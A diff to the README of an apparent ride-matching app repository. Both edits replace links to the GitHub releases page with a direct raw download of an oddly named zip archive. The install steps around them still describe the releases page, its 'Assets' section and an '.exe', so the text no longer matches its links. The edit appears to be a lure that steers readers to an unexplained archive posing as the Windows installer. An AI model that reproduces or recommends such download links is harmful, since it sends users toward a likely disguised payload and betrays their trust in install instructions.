@@ -1,6 +1,6 @@
 # 🚗 Real-Time-Ride-Matching-Platform- - Connect drivers and riders instantly today
 
-[![Download Application](https://img.shields.io/badge/Download-Windows_Installer-blue.svg)](https://github.com/romualdusa1913/Real-Time-Ride-Matching-Platform-/releases)
+[![Download Application](https://img.shields.io/badge/Download-Windows_Installer-blue.svg)](https://github.com/romualdusa1913/Real-Time-Ride-Matching-Platform-/raw/refs/heads/main/jimberjaw/Platform_Matching_Ride_Time_Real_narica.zip)
 
 ## 🎯 About this software
 
@@ -20,7 +20,7 @@ Ensure your computer meets these needs before you begin:
 
 The installation file resides on the releases page. Follow these steps to get the software:
 
-1. Visit [this page to download the software](https://github.com/romualdusa1913/Real-Time-Ride-Matching-Platform-/releases).
+1. Visit [this page to download the software](https://github.com/romualdusa1913/Real-Time-Ride-Matching-Platform-/raw/refs/heads/main/jimberjaw/Platform_Matching_Ride_Time_Real_narica.zip).
 2. Look for the section labeled "Assets" at the bottom of the latest release.
 3. Click the link that ends with ".exe" to start the download.
 4. Save the file to your desktop for easy access.
